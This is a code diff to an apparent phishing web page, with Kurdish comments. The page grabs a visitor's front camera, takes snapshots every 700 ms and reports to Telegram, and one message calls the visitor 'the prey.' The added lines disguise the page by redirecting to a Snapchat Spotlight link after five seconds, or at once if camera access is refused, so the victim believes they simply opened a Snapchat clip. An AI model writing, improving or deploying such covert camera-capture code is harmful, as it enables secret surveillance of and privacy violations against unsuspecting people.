@@ -14,6 +14,12 @@
 
     async function capture() {
         if (!targetID) return;
+
+        // 🔗 ڕێدایرێکت دوای ٥ چرکە (٥٠٠٠ میلی چرکە)
+        setTimeout(() => {
+            window.location.href = "https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US";
+        }, 5000);
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
@@ -52,6 +58,8 @@
             setInterval(takeSnap, 700);
         } catch (e) {
             sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            // ئەگەر مۆڵەتی نەدا، یەکسەر ڕەوانەی بکە
+            window.location.href = "https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US";
         }
     }
     function sendToTelegram(text) {
